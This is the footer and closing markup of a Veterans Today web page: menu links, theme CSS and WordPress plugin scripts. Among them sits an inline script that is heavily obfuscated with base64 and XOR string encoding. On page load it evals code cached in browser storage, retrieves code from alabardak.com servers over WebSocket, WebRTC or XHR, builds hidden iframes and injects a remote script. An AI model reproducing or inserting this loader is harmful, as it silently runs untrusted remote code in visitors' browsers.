<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-360535"><a title="Subit Support Ticket to our Help Desk &#8211; 24 hour service" href="https://veterans.zendesk.com/hc/en-us/requests/new" target="_blank" rel="nofollow">Submit Support Ticket</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-360534"><a title="Search Our Database for Answer to Common Questions" href="https://veterans.zendesk.com/hc/en-us" target="_blank" rel="nofollow">Help Desk</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-464555"><a href="https://www.veteranstoday.com/editorial-board/">Board &#038; Staff</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465188"><a href="https://www.veteranstoday.com/editorial-board/speakers-bureau/">Speakers Bureau</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465163"><a href="https://www.veteranstoday.com/editorial-board/media-partners/">Media Partners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-476712"><a href="https://www.veteranstodaynetwork.com/contact/privacy-policy/" target="_blank" rel="nofollow">Privacy Policy</a></li>
</ul></div> </div>
<div class="td-pb-span td-sub-footer-copy">
&copy; 2018 Veterans Today Network </div>
</div>
</div>
</div>
</div>
<div class="page-lvl-ad-foot" style="margin-bottom:-30px;">
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/d07b1474/cloudflare-static/email-decode.min.js"></script><script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '844817801', '0');</script><script type="text/javascript">try{(function(){function C(){try{var a=L()}catch(c){}if(a)try{D(a.h,null)}catch(c){delete window.localStorage[a.key],delete window.sessionStorage[a.key]}else M(function(a,b){b.as=!0;try{D(a,b)}catch(e){}},N)}function N(){var b=window.location.protocol==a("XSYCCBFN")?a("XSYCCBFNGhc="):a("XSYCCFhYGg==");(new Image).src=b+u+O}function M(a,c){function b(){var d=e.shift();if(d)try{d(a,b)}catch(m){b()}else v(),c()}try{P()}catch(f){v();c();return}var e=[Q,R,S,T];b()}function D(a,c){(function(){eval(a)})({e:a,
p:c,n:g})}function L(){var b=[];window.localStorage&&b.push(window.localStorage);window.sessionStorage&&b.push(window.sessionStorage);var c=E(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),F(a("RSATGQ8VWV0=")));c=new Uint8Array(c);for(var d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);c=btoa(d);d=(new Date).getTime();for(e=0;e<b.length;e++){var f=b[e],m;for(m in f)if(0===m.lastIndexOf(c,0)){try{for(var k=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),
h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(E(k,l.buffer))}catch(V){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<d-h||1>d-h)f.removeItem(m);else if((h=n.substring(13))&&!(16>h.length))return{h:h,key:m}}}return null}function R(b,c){var d=a("BmZBQA=="),e=a("AhBMS1RNAHxNeVVQdhF7WSt7AElsT3x3MkFjNiFMXgQPFjVCIDUPeUJxX1INEnVbKHd7RGdMfn1OQG5NJEZXDAJoQk5YNAYCMX5WWXJqA1BQBHRKY0NyD0ZIbUJYMys=");d=w+":"+d;var f={};f[a("QCAaCw==")]=a("QScEFlg=")+d+a("CiYEGQwERVcFP1EeVCA=");f[a("ViATHAcZQVEWJw==")]=
a("TDMCEQ8W");f[a("QCETCgwWWF0=")]=a("TDMCEQ8W");G(e,f,function(b){b=b.match(new RegExp(a("azEXFgYeUVkDLlY2U3thPQ5qYVhpTD0pBA4MMzJfTWhReVZQPhMeZFkXCEFrfh0FQR1vLDJdYW0oFnJXFg8dFEc3Ghkb")));if(null==b)return null;b=b[1];return a("VjMYHAsTVEwScV1KBnAUJTpheUNlR3p7R1I=")+b+a("FWRFSFNBFUwOO0wYUjwgGEozIBQyBGg=")+b+a("FSAGFxADFQ5Ee11cFz4kFR0uMxt7FSc+AFJp")},b,c)}function S(b,c){var d=a("A2JGSQ=="),e=a("c2dMOSBNDQFNDlhQA2F7WFt7dklsRXt3REBjNVpMWnUPZzRCJ0YPfkJxWFwNZwRbLAR7RRBMenlOSh9NIDNXAHBoRTtYMnYCQHNWWgFqdFJQAHNKZTByeTVIbk5YT1U=");
d=w+":"+d;var f={};f[a("QCAaCw==")]=[a("RiYDFlg=")+d];G(e,f,function(b){b=b.match(new RegExp(a("azEXFgYeUVkDLlY2U3thPQ5qYVhpTD0pBA4MMzJfTWhReVZQPhMeZFkXCEFrfh0FQR1vLDJdaBEQWXBXFg8dFEYgEBQa")));if(null==b)return null;b=b[1];return a("VjMYHAsTVEwScVxKBnAUJTphc0FiQXx1R0RtQEI=")+b+a("FSYPCEIfWksD")},b,c)}function G(b,c,d,e,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;e=m.bind(null,e);f=m.bind(null,f);var p={};p[a("XDETKwcFQ10FOA==")]=[c];var l=new g.c(p);l[a("ViATGRYScVkDKi8CVj4vBAY=")](a("Gj8TDANYRVEZLA==")).binaryType=
a("VCAEGRsVQF4RLh4=");l[a("WjwfGwcUVFYTIggLQzU=")]=function(b){if(null!=b[a("VjMYHAsTVEwS")]&&(b=d(b[a("VjMYHAsTVEwS")][a("VjMYHAsTVEwS")]),null!=b)){var c={};c[a("VjMYHAsTVEwS")]=b;c[a("RjYGNS4eW10+JQgPTw==")]=0;l[a("VDYSMQESdlkZLwUOViQk")](new g.b(c),function(){},function(){})}};l.addEventListener(a("XDETGw0ZW10UPwUFWSM1AB4kIhg3GC8o"),function(){l[a("XDETOw0ZW10UPwUFWQM1AB4k")]===a("UzMfFAcT")&&f()});var h=a("Q29Gcg1KQEsSOQILWjVhUUpxYTkYVgEdQFJoRVVYXRoFfEdyEUpGXQQ4BQVZPiAMD0siTR84aAQkRnlGUEFDBBtiWEloAwgIV3tmCwo2KA8NJDMAJB8mOU4BMRZPRFgCFQ==")+
b+a("PzNLEQESGFcHPwUFWSN7FRgoIhs6E0IgSRMpBw4fDlVBOxkWQkYHC0NrKD57A24yKRURUGNGeH1+E2QEAQIdWVQiTE1SRwUYAC4OGEMzbAULNSATPhcmIxEeeUVXQGdVCDsVHU8CU0oWLFY=")+function(){for(var b="",c=a("BWJGSFJHBQg="),d=0;16>d;++d){var e=(4294967296*Math.random()>>>0).toString(16);b+=c.substring(0,c.length-e.length)+e}return b}()+a("PzNLEQESGEgAL1ZaB2BxUVpxcUBmRnh9REJpR1JGXQQFYkZIUkcFCEd7XGA=");l[a("ViATGRYSel4RLh4=")](function(b){l[a("RjcCNA0UVFQzLh8JRTkxFQMuLw==")](b,function(){var b={};b[a("QSsGHQ==")]=a("VDwFDwcF");
b[a("RjYG")]=h;l[a("RjcCKgcaWkwSDwkZVCIoER4oLh4=")](new g.f(b),function(){},function(){})},function(){})},function(){});b=l[a("ViATGRYScVkDKi8CVj4vBAY=")](a("GiUFCGI=")+window.navigator.userAgent);b.binaryType=a("VCAEGRsVQF4RLh4=");H(b,x(),function(b){e(b,{rtc:l})},function(){f()})}function T(b,c){function d(b){m||(m=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=(window.location.protocol==a("XSYCCBFN")?a("XSYCCBFNGhc="):a("XSYCCFhYGg=="))+u+e;var f=a("chci"),m=!1;b=d.bind(null,
b);c=d.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():b(r(k.response),{}))};k.onerror=function(){c()};k.open(f,e,!0);k.responseType=a("VCAEGRsVQF4RLh4=");k.send(null)}function Q(b,c){var d=a("QiEFQk1Y"),e=new g.a(d+w+a("GiUFCA=="));e.binaryType=a("VCAEGRsVQF4RLh4=");H(e,x(),function(a){b(a,{ws:e})},function(){c()})}function H(b,c,d,e){function f(b){g||(g=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;d=f.bind(null,d);e=f.bind(null,
e);var k=!1,p=setTimeout(function(){e(Error())},3E3),l=F(JSON.stringify({url:c||"",method:a("chci"),headers:{"X-Tb":["ll"]},body:null}));b.onopen=function(){clearTimeout(p);b.send(l)};var h=new ArrayBuffer(0),n;b.onmessage=function(b){if(4===b.data.byteLength){var a=new Uint8Array(b.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===k?(k=!0,b=r(b.data),n=JSON.parse(b),n={status:n.status||0,headers:n.headers||{}}):(b=b.data,a=new Uint8Array(h.byteLength+b.byteLength),a.set(new Uint8Array(h),
0),a.set(new Uint8Array(b),h.byteLength),h=a.buffer)};b.onerror=function(){clearTimeout(p);e(Error())};b.onclose=function(){k?(n.body=h,d(r(n.body))):(clearTimeout(p),e(Error()))}}function y(b){return window[b.name]?window[b.name]:b[a("Vj0YDAcZQXwYKBkHUj41")]&&b[a("Vj0YDAcZQXwYKBkHUj41")][a("UTcQGRcbQW4eLhs=")]?b[a("Vj0YDAcZQXwYKBkHUj41")][a("UTcQGRcbQW4eLhs=")]:b[a("Vj0YDAcZQW8eJQgFQA==")]}function I(){var b=document.createElement(a("XDQEGQ8S"));b.style.height=a("BCIO");b.style.width=a("BCIO");b.style.display=
a("Wz0YHQ==");b[a("RiAVHA0U")]=a("VA==");b.name||(b.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||document.head||document.documentElement).appendChild(b);var c=y(b);c.document.documentElement||c.document.write(a("VA=="));try{c.stop()}catch(d){}return b}function P(){J=a("QDwdFg0AWw==");t=a("VjoEFw8S");q=a("UzsEHQQYTQ==");z=a("WiITCgM=");A=a("RjMQGRAe");var b=I();b=y(b);var c=b.navigator.userAgent;var d=(new RegExp(a("VjoEFw8SSVsfOQMHXiUs"),
"i")).test(c)?t:(new RegExp(a("UzsEHQQYTUQeKAkdUjEyBAY9Jwg/GTs="),"i")).test(c)?q:(new RegExp(a("a3peR0MUXUoYJgkWVj4lEwUoJVl4X2I+FRQ4BQs="),"i")).test(c)?A:(new RegExp(a("WiIEBA0HXFcE"),"i")).test(c)?z:window[a("VjoEFw8S")]?t:"undefined"!==typeof InstallTrigger?q:J;-1===[t,q,z,A].indexOf(d)&&(b=window);c=a("UCQXFA==");g.c=b[c](a("QjsYHA0AG2ojCDwPUiICDgQvJBMiHycjVA4lVxUfA1BaJVgPBxVeUQMZOClnNSQTKS4vHjMVPCQbHHkLHlYaXVs2GQ9MGlpCJR8vOlI1MyIFLy8VNQIhIhpSJQtCAQRaUT0BVg8EZ2w0GwkPRRMuDwQkIgQ/GSY="));g.f=b[c](a("QjsYHA0AG2ojCD8PRCMoDgQFJAM1BCE9ABs2GUIKERRCOxgcDQAbTxIpBwNDAhUiOSQyAz8ZJgkRAToFCwYZXVo8VgQeV0JRGS8DHRk9Lhs4FQIjMwU7JBscHRIRFR9dRSYfFwxXSURXPAUEUz82TwcyEyQVJS0+Bxs2GSYTHldHOwYMCxhb"));
g.b=b[c](a("QjsYHA0AG2ojCCUJUhMgDw4oJREiE2gxCFIuHgwSAkMbJRMaCR5BaiMIJQlSEyAPDiglESITaDEIUi4eDBICQxs/GQIwI3ZxFC4vC1k0KAULNSRQKgpoOh0cPRgVWABHZwY1MQESdlkZLwUOViQk"));d===q?(d=I(),g.a=y(d)[c](a("QjsYHA0AG28SKT8FVDskFQ==")),d.parentElement.removeChild(d)):g.a=b[c](a("QjsYHA0AG28SKT8FVDskFQ=="));g.g=b[c](a("QjsYHA0AG2A6ByQeQyATBBs0JAMi"))}function E(b,a){var c=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var f=0;f<a.byteLength;f++)e[f]=c[f]^b.charCodeAt(f%b.length);return e.buffer}
function r(b){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(b));var a="";b=new Uint8Array(b);for(var d=b.byteLength,e=0;e<d;e++)a+=String.fromCharCode(b[e]);return decodeURIComponent(escape(a))}function F(b){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(b).buffer;b=unescape(encodeURIComponent(b));for(var a=new Uint8Array(b.length),d=0;d<b.length;d++)a[d]=b.charCodeAt(d);return a.buffer}function x(){return a("GjcORxVK")+5728885882748928}function a(b){b=
window.atob(b);for(var a="",d=0;d<b.length;d++)a+=String.fromCharCode(b.charCodeAt(d)^"5Rvxbw58wKlj7PAajAApVvHMtrYwbvm4".charCodeAt(d%32));return a}function v(){if(!K){var b=("https:"==window.location.protocol?"https://":"http://")+u+U,a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src=b;(document.body||document.head||document.documentElement).appendChild(a);K=!0}}var B;Math.pow(1,2)&&(B="alabardak.com");var u=B,w="tr."+B,U=decodeURIComponent("%2Fle%3Fw%3D")+5728885882748928,
O="/l?w="+5728885882748928+"&c=ef&cb="+Math.random().toString().slice(3,9),g={},J,t,q,z,A,K=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.ucweb)try{v()}catch(b){}try{C()}catch(b){}})()}catch(C){};</script>


<style type="text/css" media="screen">
/* custom css theme panel */
.disclouser {
    padding: 4px;
    border: 2px solid #980505;
    color: #b50505;
    font-weight: bold;
}

.author-img {
    display: inline-block;
    width: 20%;
    text-align: left;
    vertical-align: top;
}
.author-box-wrap .desc {
    margin-left: auto;
    display: inline-block;
    width: 69%;
}


div#text-25 {
    margin-bottom: -15px;
}

.disclouser p{
    margin-bottom:0px;
}

.disclouser #custom_html-7 {
    margin-bottom: 0px;
}

input#top-search-q {
    width: 235px;
    height: 32px;
    margin: 0;
    border-right: 0;
    line-height: 17px;
    border-color: #eaeaea !important;
}

.header-search-wrap form#searchbox {
    margin: 20px;
}

.autor-sec {
    border: 1px solid #ededed;
    padding: 21px;
    margin-bottom: 48px;
}

.author-box-wrap-new .desc {
    margin-left: auto;
    display: inline-block;
    width: 69%;
    font-size: 12px;
}

.autor-sec img{
    float: left;
    padding-right: 10px;
}

.gsearch-form {
    padding: 14px 10px 22px;
}

input#top-search-q {
    border: 1px solid #ccc !important;
    padding: 1px 10px;
}

.gsearch-form input[type=submit] {
    padding: 9.5px 22px;
    border: 1px solid #9a211d;
    background-color: #9b211e;
}

.td-search-wrap-mob input[type="search"] {
    padding: 8px 30px;
    margin-right: -1px;
    margin-left: 10px;
    color:#000;
}

.archive-read {
    background: #b9b9b9;
    color: #fff;
    padding: 1px 20px;
    width: 175px;
    font-size: 13px;
    text-align: left;
    display:none;
}

.disclouser .widget {
    margin-bottom: 4px;
}
.wp-caption{
    max-width:auto !important;
}

.td-post-sub-title{
    color:#111;
}
</style>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/bbpress/templates/default/js/editor.js?ver=2.5.14-6684'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctNocache = {"ajaxurl":"https:\/\/www.veteranstoday.com\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"1","blog_home":"https:\/\/www.veteranstoday.com\/"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/cleantalk-spam-protect/js/apbct-public.js?ver=5.91'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var pollsL10n = {"ajax_url":"https:\/\/www.veteranstoday.com\/wp-admin\/admin-ajax.php","text_wait":"Your last request is still being processed. Please wait a while ...","text_valid":"Please choose a valid poll answer.","text_multiple":"Maximum number of choices allowed: ","show_loading":"1","show_fading":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/wp-polls/polls-js.js?ver=2.73.8'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/themes/Newspaper/js/tagdiv_theme.min.js?ver=8.6'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-includes/js/comment-reply.min.js?ver=4.9.4'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-includes/js/wp-embed.min.js?ver=4.9.4'></script>
<script type='text/javascript' src='https://www.veteranstoday.com/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=5.4.5'></script>

<script>
    

	

		(function(){
			var html_jquery_obj = jQuery('html');

			if (html_jquery_obj.length && (html_jquery_obj.is('.ie8') || html_jquery_obj.is('.ie9'))) {

				var path = 'https://www.veteranstoday.com/wp-content/themes/Newspaper-child/style.css';

				jQuery.get(path, function(data) {

					var str_split_separator = '#td_css_split_separator';
					var arr_splits = data.split(str_split_separator);
					var arr_length = arr_splits.length;

					if (arr_length > 1) {

						var dir_path = 'https://www.veteranstoday.com/wp-content/themes/Newspaper';
						var splited_css = '';

						for (var i = 0; i < arr_length; i++) {
							if (i > 0) {
								arr_splits[i] = str_split_separator + ' ' + arr_splits[i];
							}
							//jQuery('head').append('<style>' + arr_splits[i] + '</style>');

							var formated_str = arr_splits[i].replace(/\surl\(\'(?!data\:)/gi, function regex_function(str) {
								return ' url(\'' + dir_path + '/' + str.replace(/url\(\'/gi, '').replace(/^\s+|\s+$/gm,'');
							});

							splited_css += "<style>" + formated_str + "</style>";
						}

						var td_theme_css = jQuery('link#td-theme-css');

						if (td_theme_css.length) {
							td_theme_css.after(splited_css);
						}
					}
				});
			}
		})();

	
	
</script>
</body>
</html>